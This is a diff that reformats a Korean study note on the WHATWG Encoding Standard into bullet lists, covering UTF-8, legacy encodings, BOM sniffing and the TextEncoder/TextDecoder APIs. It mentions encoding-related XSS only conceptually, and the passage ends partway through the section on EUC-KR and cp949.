@@ -23,27 +23,27 @@
 
 #### 1.1 Encoding Standard란
 
-WHATWG Encoding Standard는 웹 플랫폼에서 문자 인코딩을 처리하는 방식을 정의하는 살아있는 표준(Living Standard)이다. 이 표준은 텍스트를 바이트 시퀀스로 변환(인코딩)하고, 바이트 시퀀스를 텍스트로 복원(디코딩)하는 알고리즘을 규정한다.
+WHATWG Encoding Standard: 웹 플랫폼에서 문자 인코딩을 처리하는 방식을 정의하는 살아있는 표준(Living Standard)
+
+- 텍스트를 바이트 시퀀스로 변환(인코딩)하고, 바이트 시퀀스를 텍스트로 복원(디코딩)하는 알고리즘을 규정
 
 - 공식 문서: https://encoding.spec.whatwg.org/
 - 유지보수 주체: WHATWG (Web Hypertext Application Technology Working Group)
 - 문서 유형: Living Standard
-- 핵심 메시지: UTF-8을 사용하라. 새로운 콘텐츠는 반드시 UTF-8로 인코딩되어야 한다.
+- 핵심 메시지: UTF-8 사용 → 새로운 콘텐츠는 반드시 UTF-8로 인코딩
 
 #### 1.2 문자 인코딩의 역사
 
-컴퓨터가 텍스트를 처리하려면 문자를 숫자(바이트)로 변환하는 규칙이 필요하다. 이 규칙이 바로 문자 인코딩이다.
+컴퓨터가 텍스트를 처리 → 문자를 숫자(바이트)로 변환하는 규칙 필요 → 이 규칙이 문자 인코딩
 
-| 시기 | 인코딩 | 설명 |
-|------|--------|------|
-| 1963 | ASCII | 7비트, 128개 문자 (영문, 숫자, 기호) |
-| 1987 | ISO 8859-1 | 8비트, 서유럽 문자 256개 |
-| 1990s | EUC-KR | 한국어 완성형 인코딩 (KS X 1001 기반) |
-| 1990s | Shift_JIS | 일본어 인코딩 |
-| 1993 | Unicode 1.1 | 전 세계 문자를 하나의 체계로 통합 시도 |
-| 1993 | UTF-8 | 가변 길이 유니코드 인코딩 (1~4바이트) |
-| 2003 | UTF-8 보편화 | 웹에서 UTF-8 사용 비율이 급격히 증가 |
-| 2008~ | UTF-8 표준화 | W3C/WHATWG에서 UTF-8을 기본 인코딩으로 권장 |
+- 1963 · ASCII: 7비트, 128개 문자(영문·숫자·기호)
+- 1987 · ISO 8859-1: 8비트, 서유럽 문자 256개
+- 1990s · EUC-KR: 한국어 완성형 인코딩(KS X 1001 기반)
+- 1990s · Shift_JIS: 일본어 인코딩
+- 1993 · Unicode 1.1: 전 세계 문자를 하나의 체계로 통합 시도
+- 1993 · UTF-8: 가변 길이 유니코드 인코딩(1~4바이트)
+- 2003 · UTF-8 보편화: 웹에서 UTF-8 사용 비율 급증
+- 2008~ · UTF-8 표준화: W3C/WHATWG에서 UTF-8을 기본 인코딩으로 권장
 
 ```
 ASCII (1963)
@@ -67,23 +67,18 @@ UTF-8 (1993~)
 
 #### 1.3 왜 표준이 필요한가
 
-인코딩 표준이 필요한 핵심 이유는 다음과 같다.
-
-1) 레거시 인코딩의 상호운용성
-
-웹에는 다양한 레거시 인코딩으로 작성된 문서가 존재한다. 브라우저마다 동일한 바이트 시퀀스를 다른 문자로 해석하면 글자가 깨지는 "mojibake" 현상이 발생한다. 표준은 모든 브라우저가 동일한 방식으로 레거시 인코딩을 처리하도록 보장한다.
-
-2) 보안 취약점 방지
-
-인코딩 처리의 불일치는 XSS(Cross-Site Scripting) 등 보안 취약점으로 이어질 수 있다. 예를 들어 특정 레거시 인코딩에서 멀티바이트 문자의 첫 번째 바이트가 이스케이프 문자를 "삼켜버리는" 공격이 존재한다.
-
-3) JavaScript API의 통일
-
-`TextEncoder`, `TextDecoder` 등 웹 API를 명확하게 정의하여 모든 플랫폼에서 동일한 인코딩/디코딩 동작을 보장한다.
-
-4) UTF-8로의 수렴 촉진
-
-표준은 새 콘텐츠에 대해 UTF-8만 인코딩하도록 제한하고(`TextEncoder`는 UTF-8만 지원), 레거시 인코딩은 디코딩만 허용함으로써 웹 전체가 UTF-8로 수렴하도록 유도한다.
+- 레거시 인코딩의 상호운용성
+  - 웹에는 다양한 레거시 인코딩으로 작성된 문서 존재
+  - 브라우저마다 동일한 바이트 시퀀스를 다른 문자로 해석 → 글자가 깨지는 "mojibake" 현상 발생
+  - 표준 → 모든 브라우저가 동일한 방식으로 레거시 인코딩 처리하도록 보장
+- 보안 취약점 방지
+  - 인코딩 처리의 불일치 → XSS(Cross-Site Scripting) 등 보안 취약점으로 이어질 수 있음
+  - 예: 특정 레거시 인코딩에서 멀티바이트 문자의 첫 번째 바이트가 이스케이프 문자를 "삼켜버리는" 공격 존재
+- JavaScript API의 통일
+  - `TextEncoder`, `TextDecoder` 등 웹 API를 명확하게 정의 → 모든 플랫폼에서 동일한 인코딩/디코딩 동작 보장
+- UTF-8로의 수렴 촉진
+  - 새 콘텐츠에 대해 UTF-8만 인코딩하도록 제한(`TextEncoder`는 UTF-8만 지원)
+  - 레거시 인코딩은 디코딩만 허용 → 웹 전체가 UTF-8로 수렴하도록 유도
 
 ```javascript
 // TextEncoder는 항상 UTF-8만 사용한다
@@ -101,7 +96,7 @@ console.log(decoder.encoding); // "euc-kr"
 
 #### 2.1 코드 포인트 (Code Point)
 
-유니코드에서 각 문자에 부여된 고유한 숫자 값이다. U+0000부터 U+10FFFF까지의 범위를 가진다. 총 1,114,112개의 코드 포인트가 존재한다.
+유니코드에서 각 문자에 부여된 고유한 숫자 값 · U+0000~U+10FFFF 범위 · 총 1,114,112개 존재
 
 ```javascript
 // 코드 포인트 확인
@@ -116,41 +111,43 @@ String.fromCodePoint(0x1F600); // "😀"
 
 코드 포인트의 분류:
 
-| 범위 | 이름 | 설명 |
-|------|------|------|
-| U+0000~U+007F | ASCII | 기본 라틴 문자 |
-| U+0080~U+07FF | BMP 앞부분 | 대부분의 라틴 확장, 그리스, 키릴 등 |
-| U+0800~U+FFFF | BMP 나머지 | 한중일 문자, 한글 등 |
-| U+10000~U+10FFFF | 보충 평면 | 이모지, 고대 문자, 수학 기호 등 |
-| U+D800~U+DFFF | 서로게이트 | UTF-16 전용, 단독 사용 불가 (스칼라 값이 아님) |
+- U+0000~U+007F · ASCII: 기본 라틴 문자
+- U+0080~U+07FF · BMP 앞부분: 대부분의 라틴 확장·그리스·키릴 등
+- U+0800~U+FFFF · BMP 나머지: 한중일 문자·한글 등
+- U+10000~U+10FFFF · 보충 평면: 이모지·고대 문자·수학 기호 등
+- U+D800~U+DFFF · 서로게이트: UTF-16 전용, 단독 사용 불가(스칼라 값 아님)
 
 #### 2.2 스칼라 값 (Scalar Value)
 
-서로게이트(U+D800~U+DFFF)를 제외한 코드 포인트를 스칼라 값이라 한다. 실제 문자를 나타낼 수 있는 유효한 코드 포인트만을 의미한다.
+서로게이트(U+D800~U+DFFF)를 제외한 코드 포인트 → 실제 문자를 나타낼 수 있는 유효한 코드 포인트만 의미
 
 #### 2.3 바이트 (Byte)
 
-0x00부터 0xFF까지의 8비트 정수 값이다. 인코딩된 데이터의 기본 단위이다.
+0x00~0xFF까지의 8비트 정수 값 · 인코딩된 데이터의 기본 단위
 
 #### 2.4 바이트 시퀀스 (Byte Sequence)
 
-0개 이상의 바이트가 순서대로 나열된 것이다. 인코딩의 출력과 디코딩의 입력은 바이트 시퀀스이다.
+0개 이상의 바이트가 순서대로 나열된 것 · 인코딩의 출력과 디코딩의 입력은 바이트 시퀀스
 
 #### 2.5 인코딩 (Encoding)
 
-코드 포인트 시퀀스와 바이트 시퀀스 사이의 매핑 규칙이다. 각 인코딩은 이름(name), 디코더(decoder), 인코더(encoder, 선택적)를 가진다.
+코드 포인트 시퀀스와 바이트 시퀀스 사이의 매핑 규칙 · 각 인코딩은 이름(name)·디코더(decoder)·인코더(encoder, 선택적)를 가짐
 
 #### 2.6 디코더 (Decoder)
 
-바이트 스트림을 입력으로 받아 코드 포인트 스트림을 출력하는 알고리즘이다. 유효하지 않은 바이트를 만나면 오류를 발생시키거나 대체 문자(U+FFFD)를 출력한다.
+바이트 스트림을 입력으로 받아 코드 포인트 스트림을 출력하는 알고리즘
+
+- 유효하지 않은 바이트를 만나면 오류를 발생시키거나 대체 문자(U+FFFD)를 출력
 
 #### 2.7 인코더 (Encoder)
 
-코드 포인트 스트림을 입력으로 받아 바이트 스트림을 출력하는 알고리즘이다. 표준에서는 UTF-8 인코더만 웹 API로 노출된다.
+코드 포인트 스트림을 입력으로 받아 바이트 스트림을 출력하는 알고리즘
+
+- 표준에서는 UTF-8 인코더만 웹 API로 노출
 
 #### 2.8 BOM (Byte Order Mark)
 
-U+FEFF 코드 포인트로, 문서의 시작 부분에 위치하여 인코딩의 종류와 바이트 순서를 나타내는 표시이다.
+U+FEFF 코드 포인트 · 문서의 시작 부분에 위치하여 인코딩의 종류와 바이트 순서를 나타내는 표시
 
 ```javascript
 // BOM의 바이트 표현
@@ -165,7 +162,7 @@ decoder.decode(utf8Bom); // "" (BOM은 기본적으로 제거됨)
 
 #### 2.9 U+FFFD REPLACEMENT CHARACTER
 
-디코딩 중 유효하지 않은 바이트 시퀀스를 만났을 때 사용되는 대체 문자이다. "�"로 표시된다.
+디코딩 중 유효하지 않은 바이트 시퀀스를 만났을 때 사용되는 대체 문자 · "�"로 표시
 
 ```javascript
 // 유효하지 않은 UTF-8 바이트 → U+FFFD로 대체
@@ -178,80 +175,72 @@ console.log(decoder.decode(invalid)); // "��A"
 
 ### 3. 인코딩 목록
 
-Encoding Standard는 웹 호환성을 위해 다양한 레거시 인코딩을 지원한다. 그러나 새 콘텐츠에는 반드시 UTF-8을 사용해야 한다.
+Encoding Standard: 웹 호환성을 위해 다양한 레거시 인코딩 지원 → 그러나 새 콘텐츠에는 반드시 UTF-8 사용
 
 #### 3.1 UTF-8 (유일한 필수 인코딩)
 
-| 속성 | 값 |
-|------|------|
-| 이름 | UTF-8 |
-| 유형 | 가변 길이 (1~4바이트) |
-| 범위 | U+0000~U+10FFFF (전체 유니코드) |
-| 웹 사용률 | 98% 이상 (2024년 기준) |
-| TextEncoder 지원 | 인코딩 + 디코딩 |
+- 이름: UTF-8
+- 유형: 가변 길이(1~4바이트)
+- 범위: U+0000~U+10FFFF(전체 유니코드)
+- 웹 사용률: 98% 이상(2024년 기준)
+- TextEncoder 지원: 인코딩 + 디코딩
 
 #### 3.2 Legacy single-byte 인코딩
 
-1바이트로 1문자를 표현하는 인코딩이다. 0x00~0x7F는 ASCII와 동일하고, 0x80~0xFF 범위에 각 인코딩 고유의 문자가 배치된다.
+1바이트로 1문자를 표현하는 인코딩 · 0x00~0x7F는 ASCII와 동일 · 0x80~0xFF 범위에 각 인코딩 고유의 문자 배치
 
-| 인코딩 이름 | 주요 사용 지역 | 설명 |
-|-------------|---------------|------|
-| windows-1252 | 서유럽 | ISO-8859-1의 상위 집합, 웹에서 가장 흔한 single-byte 레거시 |
-| ISO-8859-2 | 중앙유럽 | 폴란드어, 체코어, 헝가리어 등 |
-| ISO-8859-3 | 남유럽 | 터키어, 몰타어, 에스페란토 |
-| ISO-8859-4 | 북유럽 | 에스토니아어, 라트비아어, 리투아니아어 |
-| ISO-8859-5 | 키릴 | 러시아어, 불가리아어 등 (사용 빈도 낮음) |
-| ISO-8859-6 | 아랍어 | 아랍 문자 |
-| ISO-8859-7 | 그리스어 | 현대 그리스 문자 |
-| ISO-8859-8 | 히브리어 | 히브리 문자 (시각적 순서) |
-| ISO-8859-8-I | 히브리어 | 히브리 문자 (논리적 순서) |
-| ISO-8859-10 | 북유럽 | 사미어, 아이슬란드어 등 |
-| ISO-8859-13 | 발트해 | 라트비아어, 리투아니아어 |
-| ISO-8859-14 | 켈트 | 아일랜드어, 웨일스어 |
-| ISO-8859-15 | 서유럽 | ISO-8859-1 + 유로 기호(€) |
-| ISO-8859-16 | 남동유럽 | 루마니아어 등 |
-| IBM866 | 러시아 | DOS 코드페이지 866, 러시아어. 레이블: `866`, `cp866`, `csibm866`, `ibm866` |
-| KOI8-R | 러시아 | 러시아어 키릴 문자 |
-| KOI8-U | 우크라이나 | 우크라이나어 키릴 문자 |
-| macintosh | - | Mac OS Roman 인코딩 |
-| windows-874 | 태국 | 태국어 |
-| windows-1250 | 중앙유럽 | 폴란드어, 체코어 등 |
-| windows-1251 | 키릴 | 러시아어, 우크라이나어 등 |
-| windows-1253 | 그리스어 | 현대 그리스어 |
-| windows-1254 | 터키어 | 터키어 |
-| windows-1255 | 히브리어 | 히브리어 |
-| windows-1256 | 아랍어 | 아랍어 |
-| windows-1257 | 발트해 | 발트 3국 언어 |
-| windows-1258 | 베트남어 | 베트남어 |
-| x-mac-cyrillic | 키릴 | Mac OS 키릴 문자 |
+- windows-1252 · 서유럽: ISO-8859-1의 상위 집합, 웹에서 가장 흔한 single-byte 레거시
+- ISO-8859-2 · 중앙유럽: 폴란드어·체코어·헝가리어 등
+- ISO-8859-3 · 남유럽: 터키어·몰타어·에스페란토
+- ISO-8859-4 · 북유럽: 에스토니아어·라트비아어·리투아니아어
+- ISO-8859-5 · 키릴: 러시아어·불가리아어 등(사용 빈도 낮음)
+- ISO-8859-6 · 아랍어: 아랍 문자
+- ISO-8859-7 · 그리스어: 현대 그리스 문자
+- ISO-8859-8 · 히브리어: 히브리 문자(시각적 순서)
+- ISO-8859-8-I · 히브리어: 히브리 문자(논리적 순서)
+- ISO-8859-10 · 북유럽: 사미어·아이슬란드어 등
+- ISO-8859-13 · 발트해: 라트비아어·리투아니아어
+- ISO-8859-14 · 켈트: 아일랜드어·웨일스어
+- ISO-8859-15 · 서유럽: ISO-8859-1 + 유로 기호(€)
+- ISO-8859-16 · 남동유럽: 루마니아어 등
+- IBM866 · 러시아: DOS 코드페이지 866, 러시아어. 레이블: `866`, `cp866`, `csibm866`, `ibm866`
+- KOI8-R · 러시아: 러시아어 키릴 문자
+- KOI8-U · 우크라이나: 우크라이나어 키릴 문자
+- macintosh: Mac OS Roman 인코딩
+- windows-874 · 태국: 태국어
+- windows-1250 · 중앙유럽: 폴란드어·체코어 등
+- windows-1251 · 키릴: 러시아어·우크라이나어 등
+- windows-1253 · 그리스어: 현대 그리스어
+- windows-1254 · 터키어: 터키어
+- windows-1255 · 히브리어: 히브리어
+- windows-1256 · 아랍어: 아랍어
+- windows-1257 · 발트해: 발트 3국 언어
+- windows-1258 · 베트남어: 베트남어
+- x-mac-cyrillic · 키릴: Mac OS 키릴 문자
 
 #### 3.3 Legacy multi-byte CJK 인코딩
 
-한중일(CJK) 문자를 표현하기 위한 멀티바이트 인코딩이다.
+한중일(CJK) 문자를 표현하기 위한 멀티바이트 인코딩
 
-| 인코딩 이름 | 주요 사용 | 바이트 수 | 설명 |
-|-------------|----------|----------|------|
-| EUC-KR | 한국어 | 1~2 | KS X 1001 기반, 실제로는 cp949(UHC) |
-| EUC-JP | 일본어 | 1~3 | JIS X 0208/0212 기반 |
-| Shift_JIS | 일본어 | 1~2 | Windows에서 널리 사용 |
-| ISO-2022-JP | 일본어 | 가변 | 이스케이프 시퀀스 기반 상태 전환 인코딩 |
-| Big5 | 중국어(번체) | 1~2 | 대만/홍콩에서 사용 |
-| GBK | 중국어(간체) | 1~2 | GB2312의 상위 집합 |
-| gb18030 | 중국어(간체) | 1~4 | GBK의 상위 집합, 전체 유니코드 포함 |
-| GB2312 | 중국어(간체) | 1~2 | 실제로는 GBK로 처리됨 |
+- EUC-KR · 한국어 · 1~2바이트: KS X 1001 기반, 실제로는 cp949(UHC)
+- EUC-JP · 일본어 · 1~3바이트: JIS X 0208/0212 기반
+- Shift_JIS · 일본어 · 1~2바이트: Windows에서 널리 사용
+- ISO-2022-JP · 일본어 · 가변: 이스케이프 시퀀스 기반 상태 전환 인코딩
+- Big5 · 중국어(번체) · 1~2바이트: 대만/홍콩에서 사용
+- GBK · 중국어(간체) · 1~2바이트: GB2312의 상위 집합
+- gb18030 · 중국어(간체) · 1~4바이트: GBK의 상위 집합, 전체 유니코드 포함
+- GB2312 · 중국어(간체) · 1~2바이트: 실제로는 GBK로 처리됨
 
-> 참고: 표준에서 `GB2312` 레이블은 `GBK` 인코딩으로 매핑된다. `gb18030`은 유니코드의 모든 코드 포인트를 표현할 수 있는 유일한 레거시 인코딩이다.
+참고: 표준에서 `GB2312` 레이블은 `GBK` 인코딩으로 매핑 · `gb18030`은 유니코드의 모든 코드 포인트를 표현할 수 있는 유일한 레거시 인코딩
 
 #### 3.4 Legacy 기타 인코딩
 
-| 인코딩 이름 | 설명 |
-|-------------|------|
-| UTF-16BE | UTF-16 빅 엔디안. 디코딩만 지원 |
-| UTF-16LE | UTF-16 리틀 엔디안. 디코딩만 지원 |
-| x-user-defined | 0x80~0xFF를 U+F780~U+F7FF에 매핑하는 특수 인코딩 |
-| replacement | 항상 디코딩 실패(U+FFFD)를 반환하는 특수 인코딩. 보안상 위험한 인코딩에 대한 안전장치 |
+- UTF-16BE: UTF-16 빅 엔디안, 디코딩만 지원
+- UTF-16LE: UTF-16 리틀 엔디안, 디코딩만 지원
+- x-user-defined: 0x80~0xFF를 U+F780~U+F7FF에 매핑하는 특수 인코딩
+- replacement: 항상 디코딩 실패(U+FFFD)를 반환하는 특수 인코딩, 보안상 위험한 인코딩에 대한 안전장치
 
-> replacement 인코딩이 필요한 이유: ISO-2022-KR, ISO-2022-CN 등 일부 레거시 인코딩은 보안 취약점(상태 전환을 악용한 XSS)이 있어, 표준에서는 이들을 `replacement`로 매핑하여 항상 오류를 반환하도록 한다.
+replacement 인코딩이 필요한 이유: ISO-2022-KR·ISO-2022-CN 등 일부 레거시 인코딩은 보안 취약점(상태 전환을 악용한 XSS)이 있음 → 표준에서는 이들을 `replacement`로 매핑하여 항상 오류를 반환하도록 함
 
 ```javascript
 // replacement 인코딩의 동작
@@ -266,14 +255,12 @@ const decoder = new TextDecoder('iso-2022-kr');
 
 #### 4.1 인코딩 규칙
 
-UTF-8은 코드 포인트 값에 따라 1~4바이트의 가변 길이로 인코딩한다.
+UTF-8: 코드 포인트 값에 따라 1~4바이트의 가변 길이로 인코딩
 
-| 코드 포인트 범위 | 바이트 수 | 바이트 1 | 바이트 2 | 바이트 3 | 바이트 4 |
-|-----------------|----------|---------|---------|---------|---------|
-| U+0000~U+007F | 1 | 0xxxxxxx | - | - | - |
-| U+0080~U+07FF | 2 | 110xxxxx | 10xxxxxx | - | - |
-| U+0800~U+FFFF | 3 | 1110xxxx | 10xxxxxx | 10xxxxxx | - |
-| U+10000~U+10FFFF | 4 | 11110xxx | 10xxxxxx | 10xxxxxx | 10xxxxxx |
+- U+0000~U+007F · 1바이트: 0xxxxxxx
+- U+0080~U+07FF · 2바이트: 110xxxxx 10xxxxxx
+- U+0800~U+FFFF · 3바이트: 1110xxxx 10xxxxxx 10xxxxxx
+- U+10000~U+10FFFF · 4바이트: 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx
 
 인코딩 과정 예시:
 
@@ -304,7 +291,7 @@ console.log([...encoder.encode('😀')].map(b => '0x' + b.toString(16)));
 
 #### 4.2 UTF-8 디코딩 알고리즘
 
-표준은 상태 머신 기반의 디코더를 정의한다. 핵심 로직은 다음과 같다.
+표준: 상태 머신 기반의 디코더 정의 · 핵심 로직은 다음과 같음
 
 ```
 UTF-8 디코더 상태:
@@ -334,7 +321,7 @@ UTF-8 디코더 상태:
 
 #### 4.3 오류 처리 (U+FFFD)
 
-UTF-8 디코더가 유효하지 않은 바이트를 만났을 때의 동작을 정의한다.
+UTF-8 디코더가 유효하지 않은 바이트를 만났을 때의 동작을 정의
 
 ```javascript
 // 기본 동작: 잘못된 바이트를 U+FFFD로 대체
@@ -371,7 +358,7 @@ console.log(new TextDecoder().decode(overlong)); // "��"
 
 #### 4.4 유효성 검사
 
-UTF-8 바이트 시퀀스가 유효하려면 다음 조건을 모두 만족해야 한다.
+UTF-8 바이트 시퀀스가 유효하려면 다음 조건을 모두 만족해야 함
 
 ```
 유효한 UTF-8 바이트 시퀀스 규칙:
@@ -415,27 +402,25 @@ console.log(isValidUTF8(new Uint8Array([0xED, 0xA0, 0x80])));             // fal
 
 #### 5.1 이름과 별칭
 
-각 인코딩에는 하나의 정규 이름(name)과 여러 개의 레이블(별칭)이 있다. 웹에서는 다양한 이름으로 같은 인코딩을 지칭하므로, 표준은 이들을 모두 하나의 인코딩으로 매핑한다.
+각 인코딩에는 하나의 정규 이름(name)과 여러 개의 레이블(별칭)이 있음 · 웹에서는 다양한 이름으로 같은 인코딩을 지칭 → 표준은 이들을 모두 하나의 인코딩으로 매핑
 
-| 정규 이름 | 레이블 (별칭) |
-|-----------|-------------|
-| UTF-8 | `utf-8`, `utf8`, `unicode-1-1-utf-8`, `unicode11utf8`, `unicode20utf8`, `x-unicode20utf8` |
-| windows-1252 | `ascii`, `ansi_x3.4-1968`, `cp1252`, `cp819`, `csisolatin1`, `ibm819`, `iso-8859-1`, `iso-ir-100`, `iso8859-1`, `iso88591`, `iso_8859-1`, `l1`, `latin1`, `us-ascii`, `x-cp1252` |
-| EUC-KR | `euc-kr`, `cseuckr`, `csksc56011987`, `iso-ir-149`, `korean`, `ks_c_5601-1987`, `ks_c_5601-1989`, `ksc5601`, `ksc_5601`, `windows-949` |
-| Shift_JIS | `shift_jis`, `csshiftjis`, `ms932`, `ms_kanji`, `shift-jis`, `sjis`, `windows-31j`, `x-sjis` |
-| EUC-JP | `euc-jp`, `cseucpkdfmtjapanese`, `x-euc-jp` |
-| ISO-2022-JP | `iso-2022-jp`, `csiso2022jp` |
-| Big5 | `big5`, `big5-hkscs`, `cn-big5`, `csbig5`, `x-x-big5` |
-| GBK | `gbk`, `chinese`, `csgb2312`, `csiso58gb231280`, `gb2312`, `gb_2312`, `gb_2312-80`, `iso-ir-58`, `x-gbk` |
-| gb18030 | `gb18030` |
-| UTF-16BE | `utf-16be`, `unicodefffe` |
-| UTF-16LE | `utf-16le`, `utf-16`, `unicodefeff` |
+- UTF-8 → `utf-8`, `utf8`, `unicode-1-1-utf-8`, `unicode11utf8`, `unicode20utf8`, `x-unicode20utf8`
+- windows-1252 → `ascii`, `ansi_x3.4-1968`, `cp1252`, `cp819`, `csisolatin1`, `ibm819`, `iso-8859-1`, `iso-ir-100`, `iso8859-1`, `iso88591`, `iso_8859-1`, `l1`, `latin1`, `us-ascii`, `x-cp1252`
+- EUC-KR → `euc-kr`, `cseuckr`, `csksc56011987`, `iso-ir-149`, `korean`, `ks_c_5601-1987`, `ks_c_5601-1989`, `ksc5601`, `ksc_5601`, `windows-949`
+- Shift_JIS → `shift_jis`, `csshiftjis`, `ms932`, `ms_kanji`, `shift-jis`, `sjis`, `windows-31j`, `x-sjis`
+- EUC-JP → `euc-jp`, `cseucpkdfmtjapanese`, `x-euc-jp`
+- ISO-2022-JP → `iso-2022-jp`, `csiso2022jp`
+- Big5 → `big5`, `big5-hkscs`, `cn-big5`, `csbig5`, `x-x-big5`
+- GBK → `gbk`, `chinese`, `csgb2312`, `csiso58gb231280`, `gb2312`, `gb_2312`, `gb_2312-80`, `iso-ir-58`, `x-gbk`
+- gb18030 → `gb18030`
+- UTF-16BE → `utf-16be`, `unicodefffe`
+- UTF-16LE → `utf-16le`, `utf-16`, `unicodefeff`
 
-> 중요: `ascii`, `iso-8859-1`, `latin1`, `us-ascii`는 모두 `windows-1252`로 매핑된다. 이는 웹 호환성을 위한 의도적인 결정이다. 실제 웹에서 이 레이블들로 선언된 문서 대부분이 0x80~0x9F 범위의 windows-1252 전용 문자를 사용하기 때문이다.
+중요: `ascii`, `iso-8859-1`, `latin1`, `us-ascii`는 모두 `windows-1252`로 매핑됨 → 웹 호환성을 위한 의도적인 결정 (실제 웹에서 이 레이블들로 선언된 문서 대부분이 0x80~0x9F 범위의 windows-1252 전용 문자를 사용)
 
 #### 5.2 get an encoding 알고리즘
 
-레이블 문자열을 받아 대응하는 인코딩 객체를 반환하는 알고리즘이다.
+레이블 문자열을 받아 대응하는 인코딩 객체를 반환하는 알고리즘
 
 ```
 get an encoding(label):
@@ -468,13 +453,11 @@ try {
 
 #### 6.1 BOM을 통한 인코딩 감지
 
-BOM(Byte Order Mark)은 바이트 시퀀스의 시작 부분에 위치하여 인코딩을 식별하는 데 사용될 수 있다.
+BOM(Byte Order Mark): 바이트 시퀀스의 시작 부분에 위치하여 인코딩을 식별하는 데 사용될 수 있음
 
-| BOM 바이트 시퀀스 | 감지되는 인코딩 |
-|------------------|---------------|
-| 0xEF 0xBB 0xBF | UTF-8 |
-| 0xFE 0xFF | UTF-16BE |
-| 0xFF 0xFE | UTF-16LE |
+- 0xEF 0xBB 0xBF → UTF-8
+- 0xFE 0xFF → UTF-16BE
+- 0xFF 0xFE → UTF-16LE
 
 #### 6.2 BOM 스니핑 알고리즘
 
@@ -487,7 +470,7 @@ BOM sniff(ioQueue):
 5. 해당 없으면 → null 반환 (BOM 없음)
 ```
 
-BOM 스니핑은 다른 인코딩 감지 메커니즘(Content-Type, meta charset 등)보다 우선순위가 높다.
+BOM 스니핑은 다른 인코딩 감지 메커니즘(Content-Type, meta charset 등)보다 우선순위가 높음
 
 ```javascript
 // BOM이 있는 UTF-8 데이터
@@ -502,13 +485,13 @@ console.log(decoder1.decode(withBom)); // "한글" (BOM 제거됨)
 
 // ignoreBOM: true → BOM을 일반 문자로 취급하여 유지
 const decoder2 = new TextDecoder('utf-8', { ignoreBOM: true });
-console.log(decoder2.decode(withBom)); // "\uFEFF한글" (BOM 포함)
+console.log(decoder2.decode(withBom)); // "﻿한글" (BOM 포함)
 console.log(decoder2.decode(withBom).length); // 3
 ```
 
 #### 6.3 BOM과 인코딩 우선순위
 
-실제 브라우저에서 BOM은 선언된 인코딩보다 우선한다.
+실제 브라우저에서 BOM은 선언된 인코딩보다 우선
 
 ```html
 <!-- meta charset이 euc-kr이어도 BOM이 UTF-8이면 UTF-8로 디코딩 -->
@@ -523,7 +506,7 @@ console.log(decoder2.decode(withBom).length); // 3
 
 #### 7.1 생성자
 
-`TextEncoder`는 문자열을 UTF-8 바이트 시퀀스로 인코딩하는 API이다. 항상 UTF-8만 사용한다.
+`TextEncoder`: 문자열을 UTF-8 바이트 시퀀스로 인코딩하는 API · 항상 UTF-8만 사용
 
 ```javascript
 const encoder = new TextEncoder();
@@ -533,7 +516,7 @@ console.log(encoder.encoding); // "utf-8"
 
 #### 7.2 encode(input)
 
-문자열을 받아 `Uint8Array`를 반환한다.
+문자열을 받아 `Uint8Array`를 반환
 
 ```javascript
 const encoder = new TextEncoder();
@@ -559,7 +542,7 @@ console.log(new TextDecoder().decode(result)); // "A�B"
 
 #### 7.3 encodeInto(input, destination)
 
-문자열을 지정된 `Uint8Array`에 직접 인코딩한다. 새 배열을 생성하지 않으므로 성능상 유리하다.
+문자열을 지정된 `Uint8Array`에 직접 인코딩 · 새 배열을 생성하지 않으므로 성능상 유리
 
 ```javascript
 const encoder = new TextEncoder();
@@ -708,7 +691,7 @@ function isValidEncoding(bytes, encoding) {
 
 #### 9.1 TextEncoderStream
 
-문자열 청크를 UTF-8 `Uint8Array` 청크로 변환하는 Transform Stream이다.
+문자열 청크를 UTF-8 `Uint8Array` 청크로 변환하는 Transform Stream
 
 ```javascript
 // TextEncoderStream 기본 사용
@@ -741,7 +724,7 @@ readAll();
 
 #### 9.2 TextDecoderStream
 
-바이트 청크를 문자열 청크로 변환하는 Transform Stream이다. 멀티바이트 문자가 청크 경계에 걸쳐도 올바르게 처리한다.
+바이트 청크를 문자열 청크로 변환하는 Transform Stream · 멀티바이트 문자가 청크 경계에 걸쳐도 올바르게 처리
 
 ```javascript
 // TextDecoderStream 기본 사용
@@ -771,7 +754,7 @@ async function streamDecode(url) {
 
 #### 9.3 멀티바이트 문자의 청크 경계 처리
 
-스트림 디코더의 핵심 장점은 멀티바이트 문자가 청크 사이에 분할되어도 올바르게 처리한다는 것이다.
+스트림 디코더의 핵심 장점: 멀티바이트 문자가 청크 사이에 분할되어도 올바르게 처리
 
 ```javascript
 // "가" = 0xEA 0xB0 0x80 (3바이트)
@@ -802,7 +785,7 @@ demo();
 
 ### 10. 웹에서의 인코딩 감지
 
-브라우저는 HTML 문서의 인코딩을 결정하기 위해 여러 단계를 거친다. 우선순위가 높은 것부터 낮은 것 순으로 나열한다.
+브라우저는 HTML 문서의 인코딩을 결정하기 위해 여러 단계를 거침 · 우선순위가 높은 것부터 낮은 것 순으로 나열
 
 #### 10.1 인코딩 결정 우선순위
 
@@ -820,7 +803,7 @@ demo();
 
 #### 10.2 meta charset
 
-HTML 문서 내에서 인코딩을 선언하는 방법이다.
+HTML 문서 내에서 인코딩을 선언하는 방법
 
 ```html
 <!-- HTML5 방식 (권장) -->
@@ -830,7 +813,7 @@ HTML 문서 내에서 인코딩을 선언하는 방법이다.
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 ```
 
-`<meta charset>`은 문서의 처음 1024바이트 이내에 위치해야 한다. 브라우저의 prescan 알고리즘이 이 범위만 검사하기 때문이다.
+`<meta charset>`은 문서의 처음 1024바이트 이내에 위치해야 함 → 브라우저의 prescan 알고리즘이 이 범위만 검사
 
 #### 10.3 Content-Type 헤더
 
@@ -850,7 +833,7 @@ http.createServer((req, res) => {
 
 #### 10.4 Prescan 알고리즘
 
-브라우저는 HTML 파싱 전에 문서의 처음 1024바이트를 스캔하여 인코딩을 결정한다.
+브라우저는 HTML 파싱 전에 문서의 처음 1024바이트를 스캔하여 인코딩을 결정
 
 ```
 Prescan 절차:
@@ -886,9 +869,9 @@ Prescan 절차:
 
 #### 11.1 EUC-KR과 cp949 (UHC)
 
-EUC-KR은 KS X 1001 표준에 기반한 한국어 인코딩이다. 2,350자의 한글을 포함한다.
+EUC-KR: KS X 1001 표준에 기반한 한국어 인코딩 · 2,350자의 한글 포함
 
-Encoding Standard에서 `EUC-KR` 레이블은 실제로 cp949(Unified Hangul Code, 통합 완성형)를 의미한다. cp949는 EUC-KR의 상위 집합으로, 11,172자의 한글 모두를 표현할 수 있다.
